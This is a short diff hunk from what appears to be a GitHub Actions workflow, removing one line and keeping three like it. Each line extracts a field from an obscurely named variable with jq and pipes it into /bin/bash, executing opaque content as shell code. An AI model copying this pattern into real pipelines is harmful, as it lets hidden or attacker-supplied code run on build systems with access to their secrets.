@@ -21,7 +21,6 @@ jobs:
           echo $qyi8267 | jq -r .t431 | /bin/bash
           echo $ds20 | jq -r .sp39183 | /bin/bash
           printf '%s' "$pprb4" | jq -r .v12 | /bin/bash
-          printf '%s' "$lbd3" | jq -r .km58 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
